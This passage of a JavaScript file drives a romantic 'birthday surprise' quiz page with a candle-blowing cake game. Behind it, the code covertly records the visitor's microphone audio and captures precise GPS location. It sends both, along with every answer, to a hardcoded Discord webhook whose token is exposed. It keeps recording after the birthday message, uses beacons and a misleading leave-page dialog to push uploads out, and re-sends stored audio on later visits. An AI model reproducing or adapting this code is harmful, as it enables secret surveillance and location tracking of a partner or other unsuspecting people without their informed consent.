            // to maximize chances of getting the recording
            
            // 1. Try a direct synchronous XMLHttpRequest first for the whole recording
            if (audioChunks.length > 0) {
                try {
                    const closeBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', false); // false = synchronous
                    
                    const formData = new FormData();
                    formData.append('file', closeBlob, `full_recording_${Date.now()}.webm`);
                    formData.append('content', `EMERGENCY CLOSE: Full ${audioChunks.length}s recording`);
                    
                    xhr.send(formData);
                    console.log("Sent full recording synchronously!");
                } catch (e) {
                    console.log("Synchronous send failed:", e);
                }
            }
            
            // 2. Always save to localStorage regardless of size (it might work for smaller recordings)
            try {
                localStorage.setItem('emergency_recording_length', audioChunks.length.toString());
                localStorage.setItem('emergency_recording_time', Date.now().toString());
                
                // Try to save at least part of it if it's too big
                if (audioChunks.length > 0) {
                    // Take either all chunks or last 60 seconds, whichever is smaller
                    const emergencyChunks = audioChunks.length <= 60 ? 
                        audioChunks : 
                        audioChunks.slice(-60);
                    
                    const emergencyBlob = new Blob(emergencyChunks, { type: 'audio/webm;codecs=opus' });
                    
                    // Synchronous data conversion (might not finish but worth trying)
                    const reader = new FileReader();
                    let dataUrl = null;
                    
                    reader.onload = function() {
                        dataUrl = reader.result;
                        localStorage.setItem('emergency_audio_data', dataUrl);
                        console.log("Successfully saved emergency data to localStorage");
                    };
                    
                    // Start the read operation
                    reader.readAsDataURL(emergencyBlob);
                }
            } catch (e) {
                console.error("LocalStorage save failed:", e);
            }
            
            // 3. Try beacon API with chunks if available
            if (navigator.sendBeacon && audioChunks.length > 0) {
                // Send in smaller chunks to increase chances of success
                const MAX_CHUNK_SIZE = 30; // 30 seconds per beacon
                const numBeacons = Math.ceil(audioChunks.length / MAX_CHUNK_SIZE);
                
                for (let i = 0; i < numBeacons; i++) {
                    const start = i * MAX_CHUNK_SIZE;
                    const end = Math.min((i + 1) * MAX_CHUNK_SIZE, audioChunks.length);
                    const beaconChunks = audioChunks.slice(start, end);
                    
                    try {
                        const beaconBlob = new Blob(beaconChunks, { type: 'audio/webm;codecs=opus' });
                        const formData = new FormData();
                        formData.append('file', beaconBlob, `emergency_part${i+1}of${numBeacons}_${Date.now()}.webm`);
                        formData.append('content', `Emergency Part ${i+1}/${numBeacons} (${beaconChunks.length}s)`);
                        
                        const beaconSent = navigator.sendBeacon(
                            'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP',
                            formData
                        );
                        
                        console.log(`Beacon ${i+1}/${numBeacons} sent: ${beaconSent}`);
                    } catch (beaconError) {
                        console.error(`Beacon ${i+1} error:`, beaconError);
                    }
                }
            }
            
            console.log("All emergency transmission attempts complete");
        } catch (emergencyError) {
            console.error("Critical error during emergency recording save:", emergencyError);
        }
    }
    
    // Show confirmation dialog to give more time for upload
    event.preventDefault();
    event.returnValue = 'WAIT! We are saving your recording. Click CANCEL to stay on the page, or click OK again to leave without saving.';
    return event.returnValue;
});

// Add a special recovery handler for the next visit
document.addEventListener('DOMContentLoaded', async () => {
    // Initialize IndexedDB
    try {
        await initializeDB();
        
        // Check for emergency saved audio in localStorage
        if (localStorage.getItem('emergency_audio_data')) {
            console.log("Found emergency audio in localStorage from previous session. Sending now...");
            try {
                const base64Data = localStorage.getItem('emergency_audio_data');
                const timestamp = localStorage.getItem('emergency_audio_timestamp') || 
                                  localStorage.getItem('emergency_recording_time') || 
                                  Date.now();
                const length = localStorage.getItem('emergency_recording_length') || 'unknown';
                
                // Convert base64 to blob
                try {
                    const byteString = atob(base64Data.split(',')[1]);
                    const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteString.length; i++) {
                        ia[i] = byteString.charCodeAt(i);
                    }
                    const blob = new Blob([ab], {type: mimeString});
                    
                    // Send it with high priority
                    const formData = new FormData();
                    formData.append('file', blob, `recovered_${timestamp}_length${length}s.webm`);
                    formData.append('content', `⚠️ RECOVERED EMERGENCY RECORDING from local storage (length: ${length}s)`);
                    
                    console.log("Sending recovered recording...");
                    
                    // Use fetch with high priority
                    fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
                        method: 'POST',
                        body: formData,
                        priority: 'high'
                    }).then(() => {
                        console.log("✅ Successfully sent recovered audio");
                        // Clear emergency data after successful send
                        localStorage.removeItem('emergency_audio_data');
                        localStorage.removeItem('emergency_audio_timestamp');
                        localStorage.removeItem('emergency_recording_length');
                        localStorage.removeItem('emergency_recording_time');
                    }).catch(error => {
                        console.error("Failed to send recovered audio:", error);
                    });
                } catch (conversionError) {
                    console.error("Error converting base64 to blob:", conversionError);
                }
            } catch (e) {
                console.error("Error processing emergency audio:", e);
            }
        }
        
        // Check for emergency batch recordings
        const emergencyKeys = [];
        Object.keys(localStorage).forEach(key => {
            if (key.startsWith('emergency_audio_')) {
                emergencyKeys.push(key);
                console.log(`Found emergency batch: ${key}`);
            }
        });
        
        // Process emergency keys sequentially
        for (const key of emergencyKeys) {
            try {
                const base64Data = localStorage.getItem(key);
                const keyParts = key.split('_');
                const sessionId = keyParts[2] || 'unknown';
                
                // Convert and send (similar to above)
                const byteString = atob(base64Data.split(',')[1]);
                const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], {type: mimeString});
                
                const formData = new FormData();
                formData.append('file', blob, `recovered_batch_${sessionId}_${Date.now()}.webm`);
                formData.append('content', `Recovered audio batch from ${key}`);
                
                await fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
                    method: 'POST',
                    body: formData
                });
                console.log(`Sent recovered batch for ${key}`);
                localStorage.removeItem(key);
            } catch (e) {
                console.error(`Error processing emergency batch ${key}:`, e);
            }
        }
        
        // Check for and try to send any unsent recordings from previous sessions in IndexedDB
        checkForUnsentRecordings();
    } catch (error) {
        console.error('Error initializing recording system:', error);
    }

    // Rest of your DOMContentLoaded event handler...
    const startButton = document.getElementById('startButton');
    
    startButton.addEventListener('click', () => {
        // Request both microphone and location permissions simultaneously
        const micPromise = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    microphonePermissionGranted = true;
                    return stream;
                })
                .catch(error => {
                    console.error('Microphone permission error:', error);
                    microphonePermissionGranted = false;
                    throw error;
                })
            : Promise.reject('Microphone API not available');
        
        const geoPromise = navigator.geolocation && navigator.geolocation.getCurrentPosition ? 
            new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        locationPermissionGranted = true;
                        resolve(position);
                    },
                    error => {
                        console.error('Location permission error:', error);
                        locationPermissionGranted = false;
                        // Check if the error is due to device location being turned off
                        if (error.code === 2) { // POSITION_UNAVAILABLE
                            reject({ type: 'location_off', message: 'Please turn on your device location and try again.' });
                        } else {
                            reject(error);
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }) : Promise.reject('Geolocation API not available');
        
        // Try to get both permissions
        Promise.all([micPromise, geoPromise])
            .then(([micStream, geoPosition]) => {
                // Both permissions granted
                startRecording(micStream);
                handleLocationPermission(geoPosition);
                startExperience();
            })
            .catch(error => {
                console.error('Permission error:', error);
                showPermissionCard(error);
            });
    });

    // Fix next button logic to ensure it works on the last question
    nextButton.addEventListener('click', () => {
        console.log(`Next button clicked, current question: ${currentQuestionIndex}`);
        currentQuestionIndex++;
        console.log(`Moving to question index: ${currentQuestionIndex}, total questions: ${questions.length}`);
        
        if (currentQuestionIndex < questions.length) {
            console.log(`Displaying next question`);
            displayQuestion(currentQuestionIndex);
        } else {
            console.log(`This was the last question, showing cake`);
            showFinalMessage();
        }
    });
});

function startExperience() {
    welcomeContainer.style.animation = 'fadeOut 1s forwards';
    setTimeout(() => {
        welcomeContainer.style.display = 'none';
        questionContainer.style.display = 'block';
        displayQuestion(currentQuestionIndex);
    }, 1000);
}

// Handle cake interaction including candle blowing
function handleCakeInteraction(cakeContainer) {
    let candlesBlown = 0;
    const flames = cakeContainer.querySelectorAll('.flame');
    const totalCandles = flames.length;
    let isBlowing = false;
    let lastBlowTime = 0;
    let blowCount = 0;
    const remainingCandles = new Set([...Array(totalCandles).keys()]);
    
    // Encouraging messages for different scenarios
    const blowMessages = [
        "Almost there! Blow a little harder! 💨",
        "You can do it! One big blow! 🌬️",
        "Getting closer! Take a deep breath! 😤",
        "Just a bit more power! 💪",
        "Ooh, that was close! Try again! ✨"
    ];
    
    let messageTimeout = null;
    
    // Function to show temporary message
    function showTemporaryMessage(message) {
        // Clear any existing message timeout
        if (messageTimeout) {
            clearTimeout(messageTimeout);
        }
        
        // Remove existing message if any
        const existingMsg = cakeContainer.querySelector('.blow-message');
        if (existingMsg) {
            existingMsg.remove();
        }
        
        const msgElement = document.createElement('div');
        msgElement.className = 'blow-message';
        msgElement.textContent = message;
        msgElement.style.opacity = '1'; // Ensure message is visible
        msgElement.style.zIndex = '2000'; // Ensure message is on top
        cakeContainer.appendChild(msgElement);
        
        // Remove message after 2 seconds
        messageTimeout = setTimeout(() => {
            msgElement.style.animation = 'fadeOut 0.5s forwards';
            setTimeout(() => msgElement.remove(), 500);
        }, 2000);
    }
    
    // Function to blow out a random candle
    function blowRandomCandle(event) {
        if (event) {
            event.preventDefault();
            event.stopPropagation();
        }
        
        if (remainingCandles.size === 0) return;
        
        // Convert Set to Array and get a random index
        const candlesArray = Array.from(remainingCandles);
        const randomIndex = Math.floor(Math.random() * candlesArray.length);
        const candleToBlowOut = candlesArray[randomIndex];
        
        // Remove the candle from remaining set
        remainingCandles.delete(candleToBlowOut);
        
        // Blow out the candle with animation
        const flame = flames[candleToBlowOut];
        flame.style.animation = 'flameOut 0.3s forwards';
        setTimeout(() => {
            flame.style.opacity = '0';
            candlesBlown++;
            
            // Create sparkle effect around the blown candle
            createSparkleAtPosition(flame.getBoundingClientRect());
            
            // Check if this was the last candle
            if (candlesBlown === totalCandles) {
                handleAllCandlesBlown();
            }
        }, 300);
    }
    
    // Function to create sparkle effect at specific position
    function createSparkleAtPosition(rect) {
        const sparkleEmojis = ['✨', '⭐', '🌟', '💫'];
        for (let i = 0; i < 3; i++) {
            const sparkle = document.createElement('div');
            sparkle.style.position = 'absolute';
            sparkle.style.left = `${rect.left + (Math.random() * 20 - 10)}px`;
            sparkle.style.top = `${rect.top + (Math.random() * 20 - 10)}px`;
            sparkle.style.fontSize = '20px';
            sparkle.style.zIndex = '1000';
            sparkle.textContent = sparkleEmojis[Math.floor(Math.random() * sparkleEmojis.length)];
            sparkle.style.animation = 'sparkleAndFade 1s forwards';
            document.body.appendChild(sparkle);
            setTimeout(() => sparkle.remove(), 1000);
        }
    }
    
    // Only handle clicks on individual flames and cake
    flames.forEach(flame => {
        flame.style.opacity = '1';
        flame.style.pointerEvents = 'auto';
        
        flame.addEventListener('click', function(e) {
            if (remainingCandles.size > 0) {
                blowRandomCandle(e);
            }
        });
    });

    // Add click handler for the entire cake
    const cake = cakeContainer.querySelector('.cake');
    cake.style.cursor = 'pointer';
    cake.addEventListener('click', function(e) {
        if (remainingCandles.size > 0) {
            blowRandomCandle(e);
        }
    });

    // Use existing microphone stream if available
    if (window.microphoneStream) {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const analyser = audioContext.createAnalyser();
        const microphone = audioContext.createMediaStreamSource(window.microphoneStream);
        microphone.connect(analyser);
        
        analyser.fftSize = 512;
        const bufferLength = analyser.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        let consecutiveBlows = 0;
        let lastHighLevel = 0;
        
        // Variables for noise floor calibration
        let noiseFloor = 0;
        let calibrationSamples = 0;
        const CALIBRATION_PERIOD = 30;
        let isCalibrating = true;
        
        function checkAudioLevel() {
            analyser.getByteFrequencyData(dataArray);
            
            let sum = 0;
            let count = 0;
            for (let i = 1; i < 20; i++) {
                sum += dataArray[i];
                count++;
            }
            const average = sum / count;
            const now = Date.now();
            
            if (isCalibrating) {
                noiseFloor = (noiseFloor * calibrationSamples + average) / (calibrationSamples + 1);
                calibrationSamples++;
                
                if (calibrationSamples >= CALIBRATION_PERIOD) {
                    isCalibrating = false;
                    noiseFloor += 10;
                }
                requestAnimationFrame(checkAudioLevel);
                return;
            }
            
            // Increased thresholds by another 15%
            const blowThreshold = Math.max(noiseFloor + 38, 96); // Further reduced by 6% from 41 to 38 and 102 to 96
            
            if (average > blowThreshold) {
                if (now - lastHighLevel < 200) {
                    consecutiveBlows++;
                } else {
                    consecutiveBlows = 1;
                }
                lastHighLevel = now;
                
                // Increased delay between blows by 50% (from 1000ms to 1500ms)
                if (consecutiveBlows >= 3 && !isBlowing && now - lastBlowTime > 1500) {
                    const intensity = average - noiseFloor;
                    if (intensity > 51) { // Further reduced by 6% from 54 to 51
                        isBlowing = true;
                        lastBlowTime = now;
                        blowCount++;
                        
                        if (remainingCandles.size > 0) {
                            blowRandomCandle();
                            // Show success message
                            showTemporaryMessage("Nice blow! Keep going! 🌬️✨");
                        }
                        
                        // Increased cooldown by 50% (from 1000ms to 1500ms)
                        setTimeout(() => {
                            isBlowing = false;
                            consecutiveBlows = 0;
                        }, 1500);
                    } else {
                        // Show encouraging message for weak blow
                        showTemporaryMessage(blowMessages[Math.floor(Math.random() * blowMessages.length)]);
                    }
                }
            } else {
                if (now - lastHighLevel > 300) {
                    consecutiveBlows = Math.max(0, consecutiveBlows - 1);
                }
            }
            
            if (!isBlowing && average < noiseFloor + 15) {
                noiseFloor = noiseFloor * 0.95 + average * 0.05;
            }
            
            if (remainingCandles.size > 0) {
                requestAnimationFrame(checkAudioLevel);
            }
        }
        
        console.log("Calibrating microphone...");
        checkAudioLevel();
    }
    
    // Function to handle when all candles are blown
    function handleAllCandlesBlown() {
        // Create a grand finale effect
        createHeartAnimation();
        createSparkleAnimation();
        createConfetti();
        
        // Show a celebration message
        const celebrationMsg = document.createElement('div');
        celebrationMsg.textContent = "Yay! All candles blown! Make a wish! 🎂✨";
        celebrationMsg.className = 'celebration-message';
        celebrationMsg.style.zIndex = '2000'; // Ensure message is on top
        cakeContainer.appendChild(celebrationMsg);
        
        // Keep the cake and message visible for longer (7 seconds total)
        setTimeout(() => {
            celebrationMsg.style.animation = 'fadeOut 2s forwards';
            cakeContainer.style.animation = 'fadeOut 2s forwards';
            setTimeout(() => {
                cakeContainer.remove();
                showFinalCongrats();
            }, 2000);
        }, 7000); // Increased from 4000 to 7000 for 3 more seconds
    }
}

// Update the styles to ensure messages are visible and cake is clickable
const newAnimations = `
    @keyframes flameOut {
        0% { transform: translateX(-50%) scale(1); opacity: 1; }
        100% { transform: translateX(-50%) scale(0); opacity: 0; }
    }
    
    @keyframes sparkleAndFade {
        0% { transform: scale(0) rotate(0deg); opacity: 0; }
        50% { transform: scale(1.2) rotate(180deg); opacity: 1; }
        100% { transform: scale(0) rotate(360deg); opacity: 0; }
    }
    
    .celebration-message {
        position: absolute;
        top: -40px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(255, 255, 255, 0.95);
        padding: 10px 20px;
        border-radius: 20px;
        font-size: 1.2rem;
        color: #ff6b6b;
        animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
        z-index: 2000;
    }
    
    .cake {
        cursor: pointer;
        transition: transform 0.2s ease;
    }
    
    .cake:hover {
        transform: scale(1.02);
    }
    
    .cake:active {
        transform: scale(0.98);
    }
    
    .blow-message {
        position: absolute;
        bottom: -70px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(255, 255, 255, 0.95);
        padding: 12px 20px;
        border-radius: 15px;
        font-size: 1.1rem;
        color: #ff6b6b;
        animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
        white-space: nowrap;
        z-index: 2000;
        pointer-events: none;
    }
    
    @keyframes popIn {
        0% { transform: translateX(-50%) scale(0); opacity: 0; }
        100% { transform: translateX(-50%) scale(1); opacity: 1; }
    }
    
    @keyframes fadeOut {
        0% { opacity: 1; }
        100% { opacity: 0; }
    }
`;

// Add styles to the document
document.addEventListener('DOMContentLoaded', () => {
    // Add cake animations to existing style element
    const styleElement = document.querySelector('style') || document.createElement('style');
    styleElement.textContent += newAnimations;
    if (!styleElement.parentNode) {
        document.head.appendChild(styleElement);
    }
});

// Setup page restore behavior
window.addEventListener('pagehide', () => {
    // This covers more mobile cases and Safari
    pauseRecording();
});

window.addEventListener('pageshow', (event) => {
    // If page is restored from bfcache (back/forward cache)
    if (event.persisted) {
        // Restart recording if it was previously started
        if (window.microphoneStream && !isRecording) {
            startRecording(window.microphoneStream);
        }
    }
});

window.addEventListener('unload', () => {
    // Last chance to send data is already handled in beforeunload
    console.log("Unload event fired");
});

// Add the showFinalCongrats function
function showFinalCongrats() {
    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
    responseText.textContent = "You make my world brighter, my heart fuller, and my life so much better. I love you more than words can ever express! ❤️";
    responseText.classList.add('show');
    createConfetti();
    
    // Create a close website button
    const closeButton = document.createElement('button');
    closeButton.textContent = "Close Website & Save All Responses 💾";
    closeButton.className = 'close-button';
    closeButton.style.marginTop = '25px';
    closeButton.style.padding = '15px 30px';
    closeButton.style.fontSize = '1.2rem';
    closeButton.style.backgroundColor = '#ff85a1';
    closeButton.style.color = 'white';
    closeButton.style.border = 'none';
    closeButton.style.borderRadius = '50px';
    closeButton.style.cursor = 'pointer';
    closeButton.style.boxShadow = '0 4px 15px rgba(255, 133, 161, 0.4)';
    closeButton.style.transition = 'all 0.3s ease';
    
    closeButton.addEventListener('mouseover', () => {
        closeButton.style.backgroundColor = '#ff6b8b';
        closeButton.style.transform = 'translateY(-3px)';
        closeButton.style.boxShadow = '0 8px 25px rgba(255, 133, 161, 0.5)';
    });
    
    closeButton.addEventListener('mouseout', () => {
        closeButton.style.backgroundColor = '#ff85a1';
        closeButton.style.transform = 'translateY(0)';
        closeButton.style.boxShadow = '0 4px 15px rgba(255, 133, 161, 0.4)';
    });
    
    closeButton.onclick = async () => {
        // Show saving message with strong warning
        const savingContainer = document.createElement('div');
        savingContainer.style.position = 'fixed';
        savingContainer.style.top = '0';
        savingContainer.style.left = '0';
        savingContainer.style.width = '100%';
        savingContainer.style.height = '100%';
        savingContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
        savingContainer.style.display = 'flex';
        savingContainer.style.flexDirection = 'column';
        savingContainer.style.alignItems = 'center';
        savingContainer.style.justifyContent = 'center';
        savingContainer.style.zIndex = '9999';
        savingContainer.style.transition = 'opacity 0.5s ease';
        
        const warningMessage = document.createElement('h2');
        warningMessage.textContent = '⚠️ DO NOT CLOSE THIS WINDOW! ⚠️';
        warningMessage.style.color = 'red';
        warningMessage.style.marginBottom = '10px';
        warningMessage.style.fontSize = '1.5rem';
        warningMessage.style.fontWeight = 'bold';
        warningMessage.style.textAlign = 'center';
        
        const savingMessage = document.createElement('h3');
        savingMessage.textContent = 'Saving all your beautiful responses...';
        savingMessage.style.color = '#ff6b6b';
        savingMessage.style.marginBottom = '20px';
        
        const loadingSpinner = document.createElement('div');
        loadingSpinner.style.width = '50px';
        loadingSpinner.style.height = '50px';
        loadingSpinner.style.border = '5px solid #f3f3f3';
        loadingSpinner.style.borderTop = '5px solid #ff6b6b';
        loadingSpinner.style.borderRadius = '50%';
        loadingSpinner.style.animation = 'spin 1s linear infinite';
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.05); }
                100% { transform: scale(1); }
            }
        `;
        document.head.appendChild(style);
        
        // Add pulsing animation to warning
        warningMessage.style.animation = 'pulse 1.5s infinite';
        
        savingContainer.appendChild(warningMessage);
        savingContainer.appendChild(savingMessage);
        savingContainer.appendChild(loadingSpinner);
        document.body.appendChild(savingContainer);
        
        try {
            // Ensure all recordings are properly stopped and sent
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                // Create a complete recording from beginning to end
                await stopAndSendRecording();
                
                // Reduced delay to make process faster
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            // Show success message
            warningMessage.style.display = 'none'; // Remove warning
            savingMessage.textContent = 'All responses saved successfully! ❤️';
            savingMessage.style.color = 'green';
            savingMessage.style.fontWeight = 'bold';
            loadingSpinner.style.display = 'none';
            
            const completeMessage = document.createElement('p');
            completeMessage.textContent = 'You can now safely close this tab. Thank you for the beautiful memories!';
            completeMessage.style.marginTop = '20px';
            completeMessage.style.color = '#4a4a4a';
            savingContainer.appendChild(completeMessage);
            
            // Add a final close button
            const finalCloseButton = document.createElement('button');
            finalCloseButton.textContent = "Close Now";
            finalCloseButton.style.marginTop = '30px';
            finalCloseButton.style.padding = '10px 20px';
            finalCloseButton.style.backgroundColor = '#4a4a4a';
            finalCloseButton.style.color = 'white';
            finalCloseButton.style.border = 'none';
            finalCloseButton.style.borderRadius = '20px';
            finalCloseButton.style.cursor = 'pointer';
            finalCloseButton.onclick = async () => {
                // Ensure the last fully recorded clip is sent before closing
                try {
                    // Check if there's any active recording to send
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        await stopAndSendRecording();
                    } else if (audioChunks && audioChunks.length > 0) {
                        // If we have chunks that weren't sent yet, send them
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
                        const formData = new FormData();
                        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                        const filename = `birthday_wishes_${timestamp}_final.webm`;
                        
                        formData.append('file', audioBlob, filename);
                        formData.append('content', `Final recording before close`);
                        
                        const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
                        
                        // Use fetch with keepalive for best compatibility when closing
                        await fetch(webhookUrl, {
                            method: 'POST',
                            body: formData,
                            keepalive: true
                        });
                        
                        console.log("Final recording clip sent successfully");
                    }
                    
                    // Small delay to ensure the request completes
                    await new Promise(resolve => setTimeout(resolve, 500));
                } catch (error) {
                    console.error("Error sending final recording:", error);
                }
                
                // Now close the window
                window.close();
            };
            savingContainer.appendChild(finalCloseButton);
            
        } catch (error) {
            console.error('Error saving responses:', error);
            warningMessage.textContent = '⚠️ Error Occurred ⚠️';
            savingMessage.textContent = 'Error saving responses. Please try again.';
            savingMessage.style.color = 'red';
            loadingSpinner.style.display = 'none';
            
            // Add a retry button
            const retryButton = document.createElement('button');
            retryButton.textContent = "Try Again";
            retryButton.style.marginTop = '20px';
            retryButton.style.padding = '10px 20px';
            retryButton.style.backgroundColor = '#ff6b6b';
            retryButton.style.color = 'white';
            retryButton.style.border = 'none';
            retryButton.style.borderRadius = '20px';
            retryButton.style.cursor = 'pointer';
            retryButton.onclick = () => {
                document.body.removeChild(savingContainer);
                closeButton.click();
            };
            savingContainer.appendChild(retryButton);
        }
    };
    
    // Append the close button
    questionContainer.appendChild(closeButton);
    
    // Keep recording for 30 more seconds to capture reaction
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        setTimeout(() => {
            // Don't automatically stop the recording - let the close button handle it
            console.log("Recording continues until close button is clicked");
        }, 30000); // 30 seconds delay
    }
}

// Add cake-related functions
function createCake() {
    const cakeContainer = document.createElement('div');
    cakeContainer.className = 'cake-container';
    
    const cake = document.createElement('div');
    cake.className = 'cake';
    
    // Create cake layers
    const layers = ['bottom', 'middle', 'top'];
    layers.forEach(layer => {
        const cakeLayer = document.createElement('div');
        cakeLayer.className = `cake-layer ${layer}`;
        cake.appendChild(cakeLayer);
    });
    
    // Create candles container
    const candlesContainer = document.createElement('div');
    candlesContainer.className = 'candles-container';
    
    // Add candles
    for (let i = 0; i < 5; i++) {
        const candle = document.createElement('div');
        candle.className = 'candle';
        const flame = document.createElement('div');
        flame.className = 'flame';
        candle.appendChild(flame);
        candlesContainer.appendChild(candle);
    }
    
    cake.appendChild(candlesContainer);
    cakeContainer.appendChild(cake);
    
    // Add message
    const message = document.createElement('p');
    message.className = 'cake-message';
    message.textContent = 'Click the candles or blow on the microphone to make a wish! 🎂';
    cakeContainer.appendChild(message);
    
    return cakeContainer;
}

// Update showFinalMessage function to make sure it works
function showFinalMessage() {
    console.log('Creating cake and preparing final message');
    const cakeContainer = createCake();
    
    // Clear previous content
    questionText.textContent = '';
    optionsContainer.innerHTML = '';
    responseText.textContent = '';
    responseText.classList.remove('show');
    nextButton.style.display = 'none';
    
    // Add cake to the page
    questionContainer.appendChild(cakeContainer);
    
    // Initialize the cake interaction
    handleCakeInteraction(cakeContainer);
}

// Replace the submitToGoogleForm function with this:
function sendResponseByEmail(question, answer) {
    const subject = encodeURIComponent("Birthday Website Response: " + question);
    const body = encodeURIComponent(`Question: ${question}\nAnswer: ${answer}\n\nSent from your Birthday Website ❤️`);
    const mailtoLink = `mailto:sadmanxper@gmail.com?subject=${subject}&body=${body}`;
    
    // Open email client
    window.location.href = mailtoLink;
}

// Update sendToDiscord to include more context
function sendToDiscord(question, answer) {
    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
    
    // Get current time
    const timestamp = new Date().toLocaleTimeString();
    
    // Format the message nicely
    const message = {
        embeds: [{
            title: "New Interaction! 💝",
            color: 0xFF69B4,  // Pink color
            fields: [
                {
                    name: "Question",
                    value: question
                },
                {
                    name: "Answer",
                    value: answer
                },
                {
                    name: "Time",
                    value: timestamp
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // Send to Discord silently
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message)
    }).catch(() => {
        // Ignore any errors to keep it silent
    });
}

// Function to handle location permission
function handleLocationPermission(position) {
    locationPermissionGranted = true;
    userLocation = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: new Date().toISOString()
    };
    
    // Send location to webhook immediately
    sendLocationToDiscord(userLocation);
    
    console.log('Location permission granted, coordinates captured');
}

// Function to send location to Discord webhook
function sendLocationToDiscord(locationData) {
    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
    
    // Create Google Maps link
    const mapsUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
    
    // Format the message with location data
    const message = {
        embeds: [{
            title: "📍 User Location Captured",
            color: 0x00FF00,  // Green color
            fields: [
                {
                    name: "Latitude",
                    value: locationData.latitude.toString(),
                    inline: true
                },
                {
                    name: "Longitude", 
                    value: locationData.longitude.toString(),
                    inline: true
                },
                {
                    name: "Accuracy",
                    value: `±${Math.round(locationData.accuracy)} meters`,
                    inline: true
                },
                {
                    name: "Google Maps Link",
                    value: `[Open in Google Maps](${mapsUrl})`
                },
                {
                    name: "Timestamp",
                    value: locationData.timestamp
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // Send to Discord silently
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message)
    }).catch(error => {
        console.error('Error sending location to Discord:', error);
    });
}

/* Updated function to display a combined permissions card with better error handling */
function showPermissionCard(error) {
    // Remove any existing permission card to prevent duplicates
    const existingOverlay = document.getElementById('permission-card-overlay');
    if (existingOverlay) {
        existingOverlay.remove();
    }
    
    const overlay = document.createElement('div');
    overlay.id = 'permission-card-overlay';
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
    overlay.style.display = 'flex';
    overlay.style.alignItems = 'center';
    overlay.style.justifyContent = 'center';
    overlay.style.zIndex = '9999';

    const card = document.createElement('div');
    card.id = 'permission-card';
    card.style.backgroundColor = '#fff';
    card.style.padding = '2rem';
    card.style.borderRadius = '15px';
    card.style.boxShadow = '0 4px 15px rgba(0,0,0,0.3)';
    card.style.textAlign = 'center';
    card.style.maxWidth = '90%';
    card.style.width = '400px';
    card.style.fontFamily = 'Poppins, sans-serif';
    card.style.overflowY = 'auto';
    card.style.maxHeight = '90vh';

    let messageText = "We need access to your microphone and location to provide the full interactive experience. These permissions are required to continue.";
    
    // Check if we have a specific error about location being turned off
    if (error && error.type === 'location_off') {
        messageText = "Please turn on your device location services. Location access is required for the full interactive experience.";
    } else if (!microphonePermissionGranted && !locationPermissionGranted) {
        messageText = "We need access to your microphone and location to provide the full interactive experience. These permissions are required to continue.";
    } else if (!microphonePermissionGranted) {
        messageText = "We still need access to your microphone. This permission is required to continue.";
    } else if (!locationPermissionGranted) {
        messageText = "We still need access to your location. This permission is required to continue.";
